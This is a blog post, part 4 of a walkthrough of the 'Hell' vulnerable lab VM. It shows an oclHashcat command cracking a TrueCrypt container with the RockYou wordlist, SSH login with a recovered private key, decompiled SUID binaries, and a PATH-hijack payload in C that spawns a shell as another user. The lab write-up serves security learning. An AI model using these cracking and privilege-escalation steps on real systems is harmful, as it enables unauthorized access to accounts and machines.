
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Hell Walkthrough - Part 4 - FourFourFourFour</title>
  <meta name="author" content="recrudesce">

  
  <meta name="description" content="vm's Hell Walkthrough - Part 4 Part 1 | Part 2 | Part 3 | Part 4 | Part 5 Yup, we&rsquo;re still going.  Told you it&rsquo;d be a long journey didn& &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://recrudesce.github.io/blog/2014/07/20/hell-walkthrough-part-4">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/styles.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="FourFourFourFour" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <script src="/javascripts/jquery.sidr.min.js"></script>
  <script src="/javascripts/ah-blue.js"></script>
  
  

</head> 

<body   >
  <div class="aux-container">
    <a id="nav-toggle" href="#sidr"></a>
    <a id="search-toggle"></a>
</div>

<header class="header-container clearfix">
        <a href="/"><img src="/images/ah-frame.svg" onerror="this.onerror=null; this.src='ah-frame.png'"></a>
</header>

  <div class="main-container">
    <div class="main wrapper clearfix">
    	
    	<aside>
			
			  	<div class="search-container">
					<form action="http://google.com/search" method="get">
						<fieldset role="search">
							<input type="hidden" name="q" value="site:blog.alexharr.is" />
							<input class="search-field" type="text" name="q" results="0" placeholder=""/>
							<input class="submit" type="submit" value=""/>
						</fieldset>
					</form>
				</div>
			
		  <div id="main-nav">
    <nav>
        <ul>
        	<li>
        		
					<h3>Recent Posts</h3>
<ul>
	
    <li>
    	<a href="/blog/2014/12/19/because-she-was-a-princess-she-had-a-pegasus/">Because She Was a Princess She Had a Pegasus.</a>
    </li>
    
    <li>
    	<a href="/blog/2014/10/26/knock-knock-whos-there/">Knock Knock&#8230; Who&#8217;s There ?</a>
    </li>
    
    <li>
    	<a href="/blog/2014/10/26/owl-up-in-my-grill/">Owl Up in My Grill</a>
    </li>
    
    <li>
    	<a href="/blog/2014/10/26/please-do-not-feed-the-trolls/">Please Do Not Feed the Trolls.</a>
    </li>
    
    <li>
    	<a href="/blog/2014/08/13/how-many-hackers-does-it-take-to-change-a-lightbulb/">How Many Hackers Does It Take to Change a Lightbulb ?</a>
    </li>
    
</ul>





				
        	</li>
        	<li>
        		<ul>
                    <li>Projects - <a href="http://www.alexharr.is" target="_blank">alexharr.is</a>
        			<li>Github - <a href="http://www.github.com/alexharris" target="_blank">github.com/alexharris</a></li>
                    <li>Twitter - <a href="http://www.twitter.com/alexharris6" target="_blank">@alexharris6</a></li>
                    <li>Email - <a href="mailto:alexharris6@gmail.com" target="_blank">alexharris6 at gmail</a></li>
        		</ul>
        	</li>
        </ul>
    </nav>
</div>
		</aside>
		
      <div>
<article>
	<header>
  <div class="article-tags">
      

<span class="categories">
  
    <a class='category' href='/blog/categories/vms/'>vm&#8217;s</a>
  
</span>


  </div>
  
    <h1>
      Hell Walkthrough - Part 4
    </h1>
  
</header>

  <section><p><a href="http://fourfourfourfour.co/2014/07/17/hell-walkthrough-part-1/">Part 1</a> | <a href="http://fourfourfourfour.co/2014/07/18/hell-walkthrough-part-2/">Part 2</a> | <a href="http://fourfourfourfour.co/2014/07/19/hell-walkthrough-part-3/">Part 3</a> | Part 4 | <a href="http://fourfourfourfour.co/2014/07/21/hell-walkthrough-part-5/">Part 5</a></p>

<p>Yup, we&rsquo;re still going.  Told you it&rsquo;d be a long journey didn&rsquo;t I ?</p>

<h2>Tales from the Crypt, But First I&rsquo;ll Rock You</h2>

<p>George has one file in his home folder - a Truecrypt container.  I guess no one has told George that TrueCrypt isn&rsquo;t recommended any more - he should be using something else.  <em>shakes fist at the NSA</em></p>

<!-- more -->


<p>Mounting the TrueCrypt container requires us to know the container password, which we currently don&rsquo;t have.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
george@hell:~$ truecrypt &ndash;mount container.tc
Enter mount directory [default]:
Enter password for /home/george/container.tc:
Enter keyfile [none]:
Protect hidden volume (if any)? (y=Yes/n=No) [No]:
No password or keyfile specified.[/plain]</p>

<p>Looking around a bit more, it looks like George has also signed up for RockYou</p>

<p>[plain gutter=&ldquo;false&rdquo;]
From: <a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#58;&#97;&#x64;&#x6d;&#x69;&#x6e;&#64;&#114;&#111;&#x63;&#107;&#121;&#111;&#117;&#46;&#x63;&#x6f;&#x6d;">&#x61;&#100;&#x6d;&#105;&#110;&#64;&#x72;&#x6f;&#x63;&#x6b;&#x79;&#x6f;&#x75;&#x2e;&#99;&#111;&#x6d;</a>
To: <a href="&#x6d;&#97;&#x69;&#108;&#116;&#111;&#58;&#x73;&#117;&#x70;&#x65;&#114;&#95;&#97;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#104;&#101;&#108;&#x6c;&#46;&#x63;&#x6f;&#x6d;">&#x73;&#x75;&#x70;&#101;&#114;&#x5f;&#x61;&#100;&#109;&#x69;&#x6e;&#x40;&#104;&#101;&#108;&#108;&#46;&#99;&#x6f;&#x6d;</a>
Subject: Account Activation
Date: 13th November 2009</p>

<p>Thanks for signing up for your account. I hope you enjoy our services. [/plain]</p>

<p><em>ka-ching</em> George&rsquo;s password will be on the leaked RockYou wordlist.  oclHashCat can help us out here, thanks to the ability to use GPU&rsquo;s.  Yes, I&rsquo;m using a Windows PC for this, sue me.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
G:\Downloads\oclHashcat-1.21>oclHashcat64.exe -m 6211 -a 0 &ldquo;g:\downloads\container.tc&rdquo; g:\Downloads\dictionaries\catted\rockyou.txt</p>

<p>g:\downloads\container.tc:letsyouupdateyourfunnotesandmore</p>

<p>Session.Name&hellip;: oclHashcat
Status&hellip;&hellip;&hellip;: Cracked
Input.Mode&hellip;..: File (g:\Downloads\dictionaries\catted\rockyou.txt)
Hash.Target&hellip;.: File (g:\downloads\container.tc)
Hash.Type&hellip;&hellip;: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
Time.Started&hellip;: Sat Jul 12 23:06:15 2014 (17 secs)
Speed.GPU.#1&hellip;:    29889 H/s
Recovered&hellip;&hellip;: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress&hellip;&hellip;.: 496641/14343296 (3.46%)
Skipped&hellip;&hellip;..: 0/496641 (0.00%)
Rejected&hellip;&hellip;.: 1/496641 (0.00%)
HWMon.GPU.#1&hellip;: 97% Util, 56c Temp, 32% Fan</p>

<p>Started: Sat Jul 12 23:06:15 2014
Stopped: Sat Jul 12 23:06:37 2014[/plain]</p>

<p>That didn&rsquo;t take too long now did it ?  But we have the TrueCrypt container password, which makes mounting it a tiny bit easier now.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
george@hell:~$ truecrypt &ndash;mount container.tc
Enter mount directory [default]: ./tc
Enter password for /home/george/container.tc: letsyouupdateyourfunnotesandmore
Enter keyfile [none]:
Protect hidden volume (if any)? (y=Yes/n=No) [No]:</p>

<p>george@hell:~$ cd tc
george@hell:~/tc$ ls -l
total 2
-rwx&mdash;&mdash; 1 george george 1679 Jul  5 20:01 id_rsa
george@hell:~/tc$ [/plain]</p>

<p>Hmm, a private key - lets try SSHing in as bazza using this key and see what happens.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
george@hell:~/tc$ ssh <a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x62;&#x61;&#122;&#122;&#97;&#x40;&#x31;&#50;&#x37;&#x2e;&#x30;&#46;&#x30;&#46;&#x31;">&#98;&#97;&#x7a;&#122;&#97;&#x40;&#49;&#x32;&#x37;&#x2e;&#48;&#46;&#x30;&#x2e;&#x31;</a> -i ./id_rsa
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul 13 21:18:28 2014 from 192.168.0.102
$ whoami
bazza[/plain]</p>

<p>Oh&hellip; I was expecting a bit more of a fight, but I guess Bazza trusts George, even though he uses defunct software that allows privilege escalation (look it up).  Fool.</p>

<h2>Bazza&rsquo;s Blockade</h2>

<p>Once again we&rsquo;re presented with 2 binaries, with SUID attributes set.  This time, however, we can read the files, which means we can decompile them.  Time to take a look</p>

<p>[c]int <em>_cdecl main()
{
  int result; // eax@6
  </em>BYTE v1[3]; // [sp+19h] [bp-417h]@3
  FILE <em>v2; // [sp+424h] [bp-Ch]@1
  const char </em>v3; // [sp+428h] [bp-8h]@1
  const char *v4; // [sp+42Ch] [bp-4h]@1</p>

<p>  v4 = &ldquo;900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2\n&rdquo;;
  v3 = &ldquo;1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id\n&rdquo;;
  printf(&ldquo;Checking integrity of part2&hellip;&rdquo;);
  v2 = popen(&ldquo;sha256sum /home/bazza/part2&rdquo;, &ldquo;r&rdquo;);
  if ( !v2 )
    puts(&ldquo;Failed to run command&rdquo;);
  fgets(v1, 1034, v2);
  if ( strcmp(v1, v4) )
  {
    puts(&ldquo;Uh oh&hellip;. Corrupted or in wrong directory (/home/bazza/)\n&rdquo;);
    result = 0;
  }
  else
  {
    puts(&ldquo; Done!!\n&rdquo;);
    printf(&ldquo;Checking integrity of calling target&hellip;&rdquo;);
    v2 = popen(&ldquo;sha256sum /usr/bin/id&rdquo;, &ldquo;r&rdquo;);
    if ( !v2 )
      puts(&ldquo;Failed to run command&rdquo;);
    fgets(v1, 1034, v2);
    if ( strcmp(v1, v3) )
    {
      puts(&ldquo;Target corrupt\n&rdquo;);
      result = 0;
    }
    else
    {
      puts(&ldquo; Done!!\n\nBinary and target confirmed.&rdquo;);
      system(&ldquo;/home/bazza/part2&rdquo;);
      pclose(v2);
      result = 0;
    }
  }
  return result;
}[/c]</p>

<p>OK, so part1 runs part2 (this time with an absolute path), so time for a quick peek into part2</p>

<p>[c]int <strong>cdecl main()
{
  </strong>gid_t v0; // eax@2
  int result; // eax@2</p>

<p>  if ( getegid() == 1003 )
  {
    puts(&ldquo;\nCan&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>&rdquo;);
    system(&ldquo;id&rdquo;);
    result = 0;
  }
  else
  {
    v0 = getegid();
    printf(&ldquo;\n\nError! %d ID detected &hellip; you&rsquo;re not allowed to run this, please use part 1!\n&rdquo;, v0);
    result = 0;
  }
  return result;
}[/c]</p>

<p>So, part2 will run only if the effective group identifier is 1003.  part1 has a SUID attribute set as group developers, which means you have to run part1 before part2.  If you run part2 first, this happens</p>

<p>[plain gutter=&ldquo;false&rdquo;]
Error! 1004 ID detected &hellip; you&rsquo;re not allowed to run this, please use part 1![/plain]</p>

<p>Running part1 changes our effective group identifier, and part2 changes our effective user identifier, but doesn&rsquo;t seem to drop us to a shell as that user (oj)</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ./part1
Checking integrity of part2&hellip; Done!!</p>

<p>Checking integrity of calling target&hellip; Done!!</p>

<p>Binary and target confirmed.</p>

<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
$ whoami
bazza[/plain]</p>

<p>A further look into the source code for part2 shows that it is not using an absolute path for the system(&ldquo;id&rdquo;) function, therefore we can trick this application into running a bogus id binary in the same way we did with the bogus chmod binary.  The source code is pretty much the same, apart from the fact I&rsquo;m using uid 1005 rather than 1000.</p>

<p>[c]#include &lt;stdio.h></p>

<h1>include &lt;stdlib.h></h1>

<h1>include &lt;sys/types.h></h1>

<h1>include &lt;unistd.h></h1>

<p>int main()
{
 setuid( 1005 );
 system(&ldquo;/usr/bin/id&rdquo;);
 system( &ldquo;/bin/sh -i&rdquo; );
}[/c]</p>

<p>This is compiled, placed in /tmp and made executable.  The path environment variable is modified as per last time and we&rsquo;re good to go.</p>

<p>[plain gutter=&ldquo;false&rdquo;]
$ ./part1
Checking integrity of part2&hellip; Done!!</p>

<p>Checking integrity of calling target&hellip; Done!!</p>

<p>Binary and target confirmed.</p>

<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
$ whoami
oj
[/plain]</p>

<p>Success !</p>

<p>Nearly there, only this hoop to jump through and we&rsquo;re done.  I figured this&rsquo;d be a 5 parter, now I know it is going to be.</p>
</section>



	
</article>
</div>

    </div>
  </div>
  <footer class="main-footer">
	<section class="interior-footer">
		<span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
	</section>
</footer>


  








  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>




</body>
</html>
